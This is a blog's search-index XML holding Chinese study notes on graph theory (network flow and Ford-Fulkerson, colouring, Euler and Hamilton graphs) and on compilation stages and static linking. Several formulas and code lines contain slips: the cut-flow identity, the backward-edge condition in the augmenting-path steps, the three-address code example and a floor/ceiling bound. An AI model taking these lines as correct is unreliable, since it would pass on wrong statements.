<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>图论Chap9 网络流理论</title>
      <link href="/2021/11/18/graphtheory/graphtheory9/"/>
      <url>/2021/11/18/graphtheory/graphtheory9/</url>
      
        <content type="html"><![CDATA[<h2 id="网络与流函数"><a href="#网络与流函数" class="headerlink" title="网络与流函数"></a>网络与流函数</h2><div class="story post-story"><p><strong>定义：</strong>一个<strong>网络</strong>可以定义为一个四元组$N = (D,s,t,c)$其中：</p><ol><li>$D$是一个弱连通的有向图；</li><li>$s,t \in V(D)$​，分别称为<strong>源</strong>与<strong>汇</strong>；</li><li>$c:E(D) \rightarrow \mathcal{R}$为<strong>容量函数</strong>，任给$e \in E(D) , c(e) \geq 0$为边$e$的<strong>容量</strong>.​​</li></ol><p><strong>定义：</strong>网络$N = (D,s,t,c)$上的<strong>流函数</strong>为$f:E(D) \rightarrow \mathcal{R}$，要求满足：</p><ol><li>任给$e \in E(D)$，都有$c(e) \geq f(e) \geq 0$；</li><li>任给$v \in V(D) - {s,t}$​，都有$\sum_{e \in \alpha(v)}f(e) - \sum_{e \in \beta(v)}f(e) = 0$，其中$\alpha(v)$是所有以$v$为头的边集，$\beta(v)$是所有以$v$为尾的边集，$f$的<strong>流量</strong>定义为：$Val(f) = \sum_{e \in \alpha(t)}f(e) - \sum_{e \in \beta(t)}f(e) = \sum_{e \in \beta(s)}f(e) - \sum_{e \in \alpha(s)}f(e)$.</li></ol><p><strong>定义：</strong>给定网络$N = (D,s,t,c), S \subset V(D)$​，满足$s \in S,t \in \bar{S} = V(D) - S$​，则称$(S,\bar{S}) = {e = (u,v)|e \in E(D),u \in S,v \in \bar{S}}$为网络$N$的一个<strong>截</strong>，而称$C(S,\bar{S}) = \sum_{e \in (S,\bar{S})}c(e)$为$(S,\bar{S})$的<strong>截量</strong>​.截量最小的截称为<strong>最小截</strong>.</p><p><strong>定理：</strong>设$f$是网络$N = (D,s,t,c)$的流函数，$(S,\bar{S})$是其一个截，则有$Val(f) = \sum_{e \in (S,\bar{S})}f(e) - \sum_{e \in (S,\bar{S})}f(e)$.</p><p><strong>推论：</strong> 设$f$是网络$N = (D,s,t,c)$的流函数，$(S,\bar{S})$是其一个截，则有$Val(f) \leq C(S,\bar{S})$.</p><p><strong>推论：</strong>设$f$​是网络$N = (D,s,t,c)$​的流函数，$(S,\bar{S})$​是其一个截，若$Var(f) = C(S,\bar{S})$​，则$f$​是最大流，$(S,\bar{S})$是最小截.​</p></div><h2 id="Ford-Fulkerson-2F-算法"><a href="#Ford-Fulkerson-2F-算法" class="headerlink" title="Ford-Fulkerson(2F)算法"></a>Ford-Fulkerson(2F)算法</h2><div class="story post-story"><p><strong>定义：</strong>考虑有向图$D$的底图$G$，设$P(s,u)$为$G$中一条以$s$为起点$u$为终点的无向轨道，规定$P(s,u)$的方向从s到u.而$P(s,u)$上每条无向边$\bar{e}$都对应于$D$中的一条有向边$e$.若$e$的方向于$P(s,u)$的方向相同，则称$e$为$P$​的同向边(正向边)；否则称为$P$的反向边.</p><p><strong>定义：</strong>给定网络$N = (D,s,t,c)$，$N$上的流函数$f$，底图$G$中的无向轨道$P(s,u)$定义：</p><ol><li>若$e$是$P(s,u)$的正向边，且$f(e) &lt; c(e)$，则称$e$为<strong>未满载边</strong>；</li><li>若$e$​是$P(s,u)$​的正向边，且$f(e) = c(e)$​，则称$e$​​为<strong>满载边</strong>；</li><li>若$e$​是$P(s,u)$​的反向边，且$f(e) = 0$，则称$e$​​为<strong>零载边</strong>；</li><li>若$e$​是$P(s,u)$​的反向边，且$f(e) &gt; 0$​，则称$e$​​为<strong>正载边</strong>；</li></ol><p>对于无向轨道$P(s,u)$，我们定义$P(s,u)$上每条边$e$的可增载量$l(e)$为</p><ol><li>$e$是正向边：$l(e) = c(e) - f(e)$</li><li>$e$是反向边：$l(e) = f(e)$</li></ol><p>而$P(s,u)$的可增载量$l(P)$则定义为：$l(P) = min_{e \in (P)}l(e)$</p><p><strong>定义：</strong>给定网络$N = (D,s,t,c)$，$N$上的流函数$f$，以及$N$中的无向轨道$P(s,v)$​.</p><ol><li>若$l(P) &gt; 0$​ ，则称$P(s,v)$​​是<strong>未满载轨道</strong>；</li><li>若$l(P) = 0$​ ，则称$P(s,v)$​​是<strong>满载轨道</strong>；</li><li>若$l(P) &gt; 0$ 且$v = t$，则称$P(s,v)$是$N$上关于$f$的<strong>可增载轨道</strong>；</li></ol><p><strong>引理：</strong>设$f$是网络$N = (D,s,t,c)$的流函数，$P(s,t)$是$N$上关于$f$的可增载轨道，定义新的函数$\bar{f}:E(D) \rightarrow \mathcal{R}$为</p><ol><li>$e$是正向边：$\bar{f}(e) = f(e) + l(P)$</li><li>$e$是反向边：$\bar{f}(e) = f(e) - l(P)$</li><li>$e$其他：$\bar{f}(e) = f(e)$</li></ol><p>则$\bar{f}$是网络$N$的流函数，且$Val(\bar{f}) = Val(f) + l(P)$</p><p><strong>算法：可增载轨道算法</strong></p><p><strong>输入：网络$N = (D,s,t,c)$，流函数$f$</strong></p><p><strong>输出：一条可增载轨道，或指出当前流函数是最大流</strong></p><ol><li>$S = {s}$；令$prev(s) = *$.</li><li>若$t \in S$，则已找到可增载轨道，通过$prev(t)$回溯输出可增载轨道，算法停止；否则转第三步.</li><li>若存在$u \in S,v \in \bar{S}$​，使得$(u,v) \in E(D)$​且边$(u,v)$未满载，即$f((u,v)) &lt; c((u,v))$((u,v)是正向边)，则令$S \leftarrow S \bigcup {v},prev(v) = u$​转第二步；否则转第四步.</li><li>若存在$u \in S,v \in \bar{S}$，使得$(u,v) \in E(D)$且边$(u,v)$正载，即$f((u,v)) &gt; c((u,v))$((u,v)是反向边)，则令$S \leftarrow S \bigcup {v},prev(v) = u$转第二步；否则输出无可增载轨道，算法停止.</li></ol><p><strong>算法：Ford-Fulkerson算法</strong></p><p><strong>输入：网络$N = (D,s,t,c)$</strong></p><p><strong>输出：最大流函数</strong></p><ol><li>取初始流函数$f$,比如说可以取$f(e) \equiv 0$</li><li>调用可增载轨道算法，若找到可增载轨道$P(s,t)$，则构造新的流函数$\bar{f}$：<ol><li>$e$​是正向边：$\bar{f}(e) = f(e) + l(P)$</li><li>$e$是反向边：$\bar{f}(e) = f(e) - l(P)$</li><li>$e$其他：$\bar{f}(e) = f(e)$</li></ol></li></ol><p>令$f \leftarrow \bar{f}$​，转第二步.否则没有找到可增载轨道，输出$f$是最大流，停止.</p><p><strong>推论：(最大流最小截定理)</strong> 在网络中，最大流流量=最小截截量.</p></div>]]></content>
      
      
      <categories>
          
          <category> -[ustc,图论] -[数学,图论] </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图论Chap7 图的着色</title>
      <link href="/2021/11/12/graphtheory/graphtheory7/"/>
      <url>/2021/11/12/graphtheory/graphtheory7/</url>
      
        <content type="html"><![CDATA[<h1 id="顶点着色"><a href="#顶点着色" class="headerlink" title="顶点着色"></a>顶点着色</h1><p><strong>定义：</strong>图$G$的一个<strong>k-顶点着色</strong>是指把k种颜色分配给图$G$的顶点，使每个顶点都分配一种颜色；若相邻顶点颜色不同，则称这种着色是一个<strong>正常k-顶点着色</strong>，若图$G$有一个正常k-顶点着色时，称$G$是可<strong>k-顶点着色的</strong>.图$G$的<strong>顶点色数</strong>指的是图$G$可正常着色的最少色数k，简称色数，记为$ \chi(G)$.</p><p>顶点着色的性质：</p><ol><li>$v$阶图的色数满足$1 \leq \chi(G) \leq v;\chi(G) = 1$当且仅当$G$是零图(无边)；$\chi(G) = v$当且仅当$G$是$v$阶完全图.</li><li>$\chi(G) = 2$当且仅当$G$是有边二分图</li><li>$\chi(C_v) = 2 (v \equiv 0 (mod2))且 \chi(C_v) = 3 (v \equiv 1 (mod2))$​</li><li>若图H是$G$的子图，则$\chi(H) \leq chi(G)$</li></ol><p><strong>定理：</strong>对任何图$G$，$\chi(G) \leq \bigtriangleup(G) + 1$.</p><p><strong>定理(Brooks)：</strong>设$v(v \geq 3)$阶连通图$G$不是完全图也不是奇圈，则$\chi(G) \leq \bigtriangleup(G)$.</p><h1 id="边着色"><a href="#边着色" class="headerlink" title="边着色"></a>边着色</h1><p><strong>定义：</strong>图$G$的一个<strong>k-边着色</strong>是指把k种颜色分配给图G的边，使每条边都分配一种颜色；若相邻边颜色不同，则称这种着色是一个<strong>正常k-边着色</strong>，若图$G$有一个正常k-边着色时，称$G$是可<strong>k-边着色的</strong>.图$G$的<strong>边色数</strong>指的是图$G$可正常着色的最少色数k，记为$ \chi^{‘}(G)$.</p><p><strong>引理：</strong>若连通图G不是奇圈，则存在一种2-边着色，使得所用的两种颜色在每个度数大于等于2的顶点处都出现.</p><p>给定图$G$的k-边着色$C$，用$c(v)$表示顶点v关联的边中出现的颜色数，显然$c(v) \leq deg(v)$.C是正常k-边着色，当且仅当等号对$G$中所有顶点v均成立</p><p><strong>定义：</strong>设$C$和$C^{’}$是图$G$的两种k-边着色，如果$\sum_{u \in V( G)}c^{‘}(v) \geq \sum_{u \in V( G)}c(v)$，则称k-边着色$C^{‘}$是对$C$的一个<strong>改进</strong>，不能再改进的k-边着色称为最佳-k边着色</p><p><strong>引理：</strong>设$C = (E_1,E_2,…,E_k)$是图$G$的一个最佳k-边着色，如果存在一个顶点$v_0$和两种颜色i，j，使得i色不在$v_0$关联的边中出现，但j色在$v_0$关联的边中至少出现两次，则边导出子图$G[E_i \cup E_j]$中含$v_0$的连通片是一个奇圈.</p><p><strong>定理：</strong>若$G$是二分图，则$ \chi^{‘}(G) = \bigtriangleup(G)$.</p><p><strong>定理(Vizing)：</strong>若$G$是简单图，则$ \chi^{‘}(G) = \bigtriangleup(G)或 \chi^{‘}(G) = \bigtriangleup(G)  +1$</p><p><strong>引理：</strong> 设$M,N$是图$G$中两个无公共边匹配，$|M| \geq |N|,$则存在$G$中两个无公共边的匹配$M’$$N’$，使得</p><p>$|M’| = |M| - 1,|N’| = |N| - 1,M’ \bigcup N’$</p><p><strong>定理：</strong>设$G$是二分图，$\mathcal{E} = |E(G)|,\bigtriangleup \leq p$，则存在$G$的p个不相交匹配$M_1,M_2,…,M_p$，使得$E(G) = \bigcup_{i = 1}^{p}M_i$,且对$1 \leq i \leq p$，有$  \left\lceil {\mathcal{E} / p} \right\rceil \leq |M_i| \leq \left\lfloor {\mathcal{E} / p} \right\rceil $.</p><h1 id="平面图着色"><a href="#平面图着色" class="headerlink" title="平面图着色"></a>平面图着色</h1><p><strong>定义：</strong>平面图$G$的一个<strong>正常着色</strong>是指：对其一个平面嵌入$G’$的每个面(国家)着一种颜色，使得相邻的两个面着不同的颜色.若能用k中颜色给$G’$的面正常着色，就称$G$是<strong>k-面着色的</strong>.若$G$是k-面着色的，但不是(k - 1)-面着色的，则称$G$的<strong>面色数</strong>为k，记为$\chi_*(G) = k$</p><p><strong>定义：</strong>设$G$是平面图，$G’$是$G$的平面嵌入，构造$G$的<strong>对偶图</strong>$G^*$如下：</p><ol><li>$G’$的每个面$f$，都有$G^{<em>}$​​​​的一个顶点$f^{</em>}$与之对应</li><li>$G’$​​的每条边e都有$G^{<em>}$​​的一条边$e^{</em>}$​​与之对应：若$e$​​在$G’$​​的两个面$f_i$​​和$f_j$​​的公共边界上，则在$G^{<em>}$​​中$e</em>$​​连接的这两个面对应的顶点是$f_{i}^{<em>}$和​$f_{j}^{</em>}$​​；若e只在一个面$f_i$​​的边界上，则在$G^{<em>}$​中对应的$e^{</em>}$​是以$f_{i}^{*}$​为端点的环</li></ol><p>由定义易知下述性质成立：</p><ol><li>$G^{*}$是平面图，且是平面嵌入</li><li>若e是$G’$中的环，则它对应的边$e^{<em>}$是$G^{</em>}$的桥；若e是$G’$中的桥，则$e^{<em>}$是$G^{</em>}$的环</li><li>$G^{*}$是连通图</li><li>若$G’$​​的面$f_{i}^{<em>}$​​和$f_{j}^{</em>}$​​的边界上至少有两条公共边，则关联$f_{i}^{<em>}$​​和$f_{j}^{</em>}$​的边有重边</li><li>两个同构图的对偶图不一定同构</li></ol><p><strong>定理：</strong>设$G^{<em>}$是连通平面图$G$的对偶图，$n^{</em>},m^{<em>},\phi^{</em>}$和$n,m,\phi$分别是$G^{*}$和$G$的顶点数，面数和边数，则</p><ol><li>$n^{<em>} = \phi,m^{</em>} = m,\phi^{*} = n$；</li><li>设$G^{<em>}$的顶点$f^{</em>}$与$G’$的面$f$对应，则$deg_{G^{<em>}}(f^{</em>}) = deg_{G}(f)$.</li></ol><p><strong>定理：</strong>设$G$是连通的无环平面图，则$G$是k-面着色的，当且仅当它的对偶图$G^{*}$是可k-顶点着色的</p><p><strong>定理：</strong>任何平面图都是可5-顶点着色的.</p><h1 id="颜色多项式"><a href="#颜色多项式" class="headerlink" title="颜色多项式"></a>颜色多项式</h1><p>该概念是birkhoff为攻克四色猜想而提出的(虽然不懂为什么要学)</p><p>给定标定图$G$($G$的顶点已标号)和颜色数k，用$p_k(G)$表示图$G$的正常顶点着色的方法数，显然$p_k(G) &gt; 0$，当且仅当$G$是可k-顶点着色的，$p_k(G)$是k的一元函数，定义域是$k \in N,k \geq \chi(G)$，但是$G$不同，这个颜色也不同</p><p>根据$p_k(G)$的定义可得到结论如下：</p><ul><li>$p_k(G) = k^{\gamma}$，当且仅当$G$是$\gamma$阶零图</li><li>$p_k(G) = k(k - 1)(k - 2)…(k - \gamma + 1)$，当且仅当G是$\gamma$阶完全图</li><li>$p_4(平面图) &gt; 0$，当且仅当四色猜想成立</li><li>若$G_1,G_2,…,G_{w}$​是图$G$​的连通片，则$p_k(G) = \prod_{i = 1}^{w}P_k(G_i)$.</li></ul><p><strong>定理：</strong>若$G$是简单图，则对$G$的任意一条边<em>e</em>，都有$p_k(G) = p_k(G - e) - p_k(G * e)$.</p><p><strong>推论：</strong>对于任何$\gamma$个顶点$\mathcal{E}$条边的图$G$，$p_k(G)$都是$k$ 的$\gamma$次多项式，且按降幂排列时，首项系数为1，第二项系数为$-\gamma$，常数项为0，且系数是正负交替的.</p>]]></content>
      
      
      <categories>
          
          <category> -[ustc,图论] -[数学,图论] </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程序员的自我修养Chap2：静态链接</title>
      <link href="/2021/11/11/elfbook2/"/>
      <url>/2021/11/11/elfbook2/</url>
      
        <content type="html"><![CDATA[<h2 id="编译和链接"><a href="#编译和链接" class="headerlink" title="编译和链接"></a>编译和链接</h2><div class="story post-story"><p>一个c程序编译需要四个过程：<strong>预处理(Prepressing)，编译(Compilation)，汇编(Assembly)和链接(Linking)</strong>.</p><p>以下我们以gcc编译命令为例</p><h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><p>第一步预编译的过程相当于如下指令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">gcc -E hello.c -o hello.i</span></span><br></pre></td></tr></table></figure><p>预编译过程主要处理哪些源代码中的以#开始的预编译指令，如#define,#include,#ifdef等，主要规则如下：</p><ol><li>将所有的#define删除，并且展开所有宏定义</li><li>处理所有条件预编译指令，如#if，#ifdef，#elif，#else，#endif</li><li>处理#include预编译指令，将被包含文件插入到该预编译指令的位置，需要注意的是这个过程是递归执行的，也就是说被包含的文件可能还包含其他文件</li><li>删除所有注释</li><li>添加行号和文件名标识，以便于编译时编译器产生调试用的行号信息及用于编译时产生的编译错误或警告能显示行号</li><li>保留所有的#pragma编译器指令，因为编译器要使用</li></ol><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">gcc -S hello.i -o hello.s</span></span><br></pre></td></tr></table></figure><p>编译过程就是把预处理完的文件进行一系列词法分析，语法分析，语义分析及优化后生成相应的汇编代码文件，这个过程往往是我们所说的整个程序构建的核心部分，也是最复杂的部分之一。我们将在下节简单介绍编译的具体几个步骤。</p><h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><p>汇编器是将汇编代码转变成机器可执行的指令，每个汇编语句几乎都对应一条机器指令。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">gcc -c hello.s -o hello.o</span></span><br></pre></td></tr></table></figure><p>或调用汇编器as完成：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">as hello.s -o hello.o</span></span><br></pre></td></tr></table></figure><p>或者使用gcc直接经历前三个过程直接输出目标文件(Object file):</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">gcc -c hello.c -o hello.o</span></span><br></pre></td></tr></table></figure><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p>链接通常是比较令人费解的过程，为什么汇编器不直接输出可执行文件而是输出一个目标文件呢？链接过程包含了什么？为什么要链接？</p><p>下面我们来进行分析:)</p></div><h2 id="编译器做了什么"><a href="#编译器做了什么" class="headerlink" title="编译器做了什么"></a>编译器做了什么</h2><div class="story post-story"><p>最直观的角度来说，编译器是将高级语言翻译成机器语言的工具。</p><p>编译过程一般分为6步：扫描、词法分析、语义分析、源代码优化、代码生成和目标代码优化</p><p>以一段简单的C代码为例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">array</span>[index] = (index + <span class="number">4</span>) * (<span class="number">2</span> + <span class="number">6</span>);</span><br><span class="line"><span class="comment">//CompilerExpression.c</span></span><br></pre></td></tr></table></figure><h3 id="词法分析"><a href="#词法分析" class="headerlink" title="词法分析"></a>词法分析</h3><p>源代码程序首先被输入到<strong>扫描器(Scanner)</strong> 中，扫描器的任务很简单，它只是简单的进行词法分析，运用一种类似于<strong>有限状态机</strong> 的算法可以很轻松地将源代码的字符序列分割成一系列<strong>记号</strong> 。</p><p>词法分析产生的记号一般可分为如下几类：关键字、标识符、字面量(包含数字、字符串等)和特殊记号(如加号、等号)。在识别记号的同时，扫描器也完成了其他工作。比如将标识符存放到符号表，将数字、字符串常量存放到文字表等，以备后续使用</p><p>对于一些有预处理的语言(比如C)，它的宏替换和文件包含等工作一般不归入编译器的范围而交给一个独立的预处理器</p><h3 id="语法分析"><a href="#语法分析" class="headerlink" title="语法分析"></a>语法分析</h3><p>接下来<strong>语法分析器(Grammar Parser)</strong> 将对由扫描器产生的记号进行语法分析。从而产生<strong>语法树(Syntax Tree)</strong> 。整个分析过程采用了<strong>上下文无关语法(Context-free Grammer)</strong> 的分析手段。</p><h3 id="语义分析"><a href="#语义分析" class="headerlink" title="语义分析"></a>语义分析</h3><p>接下来的语义分析由<strong>语义分析器(Semantic Analyzer)</strong> 完成。语法分析仅仅是完成了对表达式语法层面的分析，但它并不了解这个语句是否真正有意义。扁你一起所能分析的语义是<strong>静态语义(Static Semantic)</strong> ，所谓静态语义是指在编译期可以确定的语义，与之相对的是<strong>动态语义(Dynamic Semantic)</strong> 就是只有在运行期才能确定的语义.</p><p>静态语义通常包括声明和类型的匹配，类型的转换。比如当一个浮点型表达式赋给一个整型的表达式时，其中隐含了一个浮点型到整型转换的过程，语义分析过程中需要完成这个步骤。比如将一个浮点型赋值给一个指针的时候，语义分析程序会发现类型不匹配，编译器将会报错。动态语义一般是指在运行期出现的语义相关的问题，比如将0作为除数是一个运行期语义错误。</p><h3 id="中间语言生成"><a href="#中间语言生成" class="headerlink" title="中间语言生成"></a>中间语言生成</h3><p>现代编译器有很多层次的优化，往往在源代码级别会有一个优化过程。我们这里描述的<strong>源码级优化器(Source Code Optimizer)</strong> 在不同编译器中可能会有不同的定义或有一些其他的差异。源码级优化器会在源代码级别进行优化。(例如(2 + 6)这个表达式就可以优化掉，因为它的值在编译时就可以确定)。</p><p>其实直接在语法树上做优化比较困难，所以源代码优化器往往将整个语法树转换成<strong>中间代码(Intermediate Code)</strong> ，它是语法树的顺序表示，其实它已经非常接近目标代码了。但是它一般跟目标机器和运行时环境是无关的，比如它不包含数据的尺寸、变量地址和寄存器名字等。中间代码有很多种类型，在不同编译器中有着不同的形式，比较常见的有：<strong>三地址码(Three-address Code)和P-代码(P-Code)</strong></p><p>以三地址码为例，最基本的三地址码是这样的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x = y op z<span class="comment">//op is a opreator</span></span><br></pre></td></tr></table></figure><p>eg:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//优化前</span></span><br><span class="line">t1 = <span class="number">2</span> + <span class="number">6</span>;</span><br><span class="line">t2 = index * <span class="number">4</span>;</span><br><span class="line">t3 = t2 * t1;</span><br><span class="line"><span class="built_in">array</span>[index] = t3;</span><br><span class="line"></span><br><span class="line"><span class="comment">//优化后</span></span><br><span class="line">t2 = index + <span class="number">4</span>;</span><br><span class="line">t2 = t2 * <span class="number">8</span>;</span><br><span class="line"><span class="built_in">array</span>[index] = t2;</span><br></pre></td></tr></table></figure><p>中间代码使得编译器可以被分为前端或后端。编译器前端负责产生机器无关的中间代码，编译器后端将中间代码转换成目标机器代码。这样对于一些可以跨平台的编译器而言，它们可以针对不同的平台使用同一个前端和针对不同机器平台的数个后端。</p><h3 id="目标代码生成与优化"><a href="#目标代码生成与优化" class="headerlink" title="目标代码生成与优化"></a>目标代码生成与优化</h3><p>编译器后端主要包括<strong>代码生成器(Code Generator)</strong> 和<strong>目标代码优化器(Target Code Optimizer)</strong> 。代码生成器将中间代码转换成目标机器代码，这个过程十分依赖于目标机器，因为不同机器有着不同的字长、寄存器、整数数据类型和浮点数数据类型等。目标代码优化器对上述的目标代码进行优化，比如选择合适的寻址方式，使用位移来代替乘法运算、删除多余的指令等。</p><p>经过了这六个一系列的过程后，源代码终于被编译成了目标代码，但还是留下了一个问题：<strong>index和array的地址还没有确定</strong> 。如果我们要把目标代码使用编译器编译成真正能够在机器上执行的指令，那么index和array的地址从哪得到？如果index和array定义在跟上面源代码同一个编译单元里面，那么编译器可以为index和array分配空间，确定他们的地址；那如果是定义在的其他程序模块呢？</p></div><h2 id="模块拼装——静态链接"><a href="#模块拼装——静态链接" class="headerlink" title="模块拼装——静态链接"></a>模块拼装——静态链接</h2><div class="story post-story"><p>人们把每个源代码模块独立地编译，然后按照需要将它们“组装”起来，这个组装的过程就是<strong>链接(Linking)</strong> 。链接的主要内容就是把各个模块之间的相互引用部分都处理好，使得各个模块之间都能正确地衔接。从原理上来讲，它的工作是把一些指令对其他符号地址的引用加以修正。链接过程主要包括：<strong>地址个空间分配(Address and Storage Allocation)、符号决议(Symbol Resolution)和重定位</strong> 等这些步骤。</p><p>最基本的静态链接过程：每个模块的源代码文件(如.c)文件经过编译器编译成<strong>目标文件(Object File)**，目标文件和</strong>库(Library)<strong>一起链接形成最终可执行文件。而最常见的库就是</strong>运行时库(Runtime Library)** ，它是支持程序运行的基本函数的集合。库其实是一组目标文件的包，就是一些最常用的代码编译成目标文件后打包存放。</p><p><strong>链接的具体解释：</strong></p><p>比如我们在程序模块main.c中使用另一个模块fun.c中的函数foo()。我们在main.c模块中每一处调用foo的时候都必须确切知道foo这个函数的地址，但是由于每个模块都是单独编译的，在编译器编译main.c的时候它并不知道foo函数的地址，所以它暂时把这些调用foo指令的目标地址搁置，等待最后链接的时候由链接器去将这些指令的目标地址修正。使用链接器，你可以直接引用其他模块的函数和全局变量而无须直到它们的地址，因为链接器在链接的时候，会根据你所引用的符号foo，自动去fun.c模块查找foo的地址，然后将main.c模块中所有引用到foo的指令重新修正，让它们的目标地址为真正的foo函数的地址。这就是静态链接的最基本的过程和作用。</p><p>在链接过程中，对其他定义在目标文件中的函数调用的指令需要被重新调整，对使用其他定义在其他目标文件的变量来说也存在同样的问题：</p><p>假设存在一个全局变量var在目标文件A中。我们在目标文件B有这样一条指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movl $0x2a,var</span><br></pre></td></tr></table></figure><p>得到的机器码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C705(指令码)00 00 00 00(目标地址) 2a 00 00 00(源常量) </span><br></pre></td></tr></table></figure><p>由于在编译目标文件B的时候，编译器并不知道var的目标地址，所以编译器在没法确定地址大情况下，将这条mov指令的目标地址设为0，等待链接器将目标文件A和B链接起来的时候再将其修正。这个地址修正的过程也被叫做<strong>重定位(Relocation)</strong> ，每个要被修正的地方叫一个<strong>重定位入口(Relocation Entry)</strong> 。重定位所做的就是给程序中每个这样的绝对地址引用的位置“打补丁”，使它们指向正确到地址。</p></div>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
          <category> 程序员的自我修养 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>图论Chap6 欧拉图和汉密尔顿图</title>
      <link href="/2021/10/31/graphtheory/graphtheory6/"/>
      <url>/2021/10/31/graphtheory/graphtheory6/</url>
      
        <content type="html"><![CDATA[<h1 id="欧拉图"><a href="#欧拉图" class="headerlink" title="欧拉图"></a>欧拉图</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><div class="story post-story"><p><strong>定义：</strong>经过图G每条边的行迹称为<strong>欧拉迹</strong>；经过图G每条边的闭行迹称为<strong>欧拉回路</strong>，如果图G含有欧拉回路，则称G为<strong>欧拉图</strong>.</p><p><strong>定理：</strong>设G是连通图，则下面三个命题等价：</p><ol><li><strong>G是欧拉图</strong></li><li><strong>G的每个顶点的度数都是偶数</strong></li><li><strong>G可以表示成无公共边的圈的并</strong></li></ol><p><strong>推论：</strong>连通图G有欧拉迹，当且仅当图G种最多有两个顶点的度数为奇数。</p><p><strong>定理：</strong>(上定理的有向图表示法)设D是有向图，且略去D中边的方向后，对应的无向图连通，则下面三个命题等价：</p><ol><li><strong>D是欧拉图</strong></li><li>$\forall v \in V(D),deg^+(v) = deg^-(v)$</li><li><strong>D可以表示成无公共边的有向圈之并</strong></li></ol></div><h2 id="欧拉回路算法"><a href="#欧拉回路算法" class="headerlink" title="欧拉回路算法"></a>欧拉回路算法</h2><div class="story post-story"><p>（待补充…)</p><h1 id="中国邮递员问题"><a href="#中国邮递员问题" class="headerlink" title="中国邮递员问题"></a>中国邮递员问题</h1></div><h2 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h2><div class="story post-story"><p>问题描述：一位邮递员从邮局出发去投递信件，他必须经过由他负责投递的每条街道至少一次，最后返回邮局，为这个邮递员设计一条最短投递线路.</p></div><h2 id="最优投递路线算法"><a href="#最优投递路线算法" class="headerlink" title="最优投递路线算法"></a>最优投递路线算法</h2><div class="story post-story"><p><strong>Edmonds-Johnson算法：</strong></p><p>输入：加权图$G = (V(G),E(G),w(G))$</p><p>输出：图$G$的一条最优投递路线</p><p>算法描述：</p><ol><li></li><li></li><li></li><li></li><li></li><li></li></ol><h1 id="汉密尔顿图"><a href="#汉密尔顿图" class="headerlink" title="汉密尔顿图"></a>汉密尔顿图</h1><p><strong>定义：</strong>经过图G每个顶点的轨道称为<strong>汉密尔顿轨道</strong>；经过图G每个顶点的圈称为<strong>汉密尔顿圈</strong>.如果图G含有汉密尔顿圈，则称这个图为<strong>汉密尔顿图</strong>.</p><p>（规定平凡图是汉密尔顿图）</p></div><h2 id="汉密尔顿图的判定条件"><a href="#汉密尔顿图的判定条件" class="headerlink" title="汉密尔顿图的判定条件"></a>汉密尔顿图的判定条件</h2><div class="story post-story"><p><strong>定理(汉密尔顿图的必要条件)：</strong>设G是汉密尔顿图，则对$V(G)$​的每个非空真子集S，均有$w(G - S) \leq |S|$​，其中$w(.)$​​是连通片个数.</p><p><strong>定理(Dirac:汉密尔顿图的充分条件)：</strong>设G是简单图，且$v(G) \geq 3,\delta(G) \geq v(G) / 2$​​，则G是汉密尔顿图.</p><p><strong>引理：</strong>设$G = (V,E)$​是简单图，u和v是G中两个不相邻的顶点，且$deg(u)+deg(v) \geq v(G)$，则G是汉密尔顿图，当且仅当$G+uv$是汉密尔顿图.</p><p><strong>定义：</strong>G的<strong>闭包</strong>:$c(G)$指反复连接G中度数之和不小于$v(G)$的不相邻顶点对，直到没有这样的点对为止.</p><p><strong>引理</strong>：$c(G)$​是唯一确定的.</p><p><strong>定理：</strong>简单图G是汉密尔顿图，当且仅当它的闭包$c(G)$是汉密尔顿图.</p><p><strong>推论：</strong>设G是$v(G) \geq 3$的简单图，若$c(G)$是完全图，则G是汉密尔顿图.</p><p><strong>定理：</strong>设$v(G) \geq 3$，对G的任意一对顶点u,v，若$deg(u)+deg(v) \geq v(G) - 1$，则G有汉密尔顿轨道；若$deg(u)+deg(v) \geq v(G)$，则G是汉密尔顿图.</p></div>]]></content>
      
      
      <categories>
          
          <category> -[ustc,图论] -[数学,图论] </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图论Chap5 匹配理论</title>
      <link href="/2021/10/12/graphtheory/graphtheory1/"/>
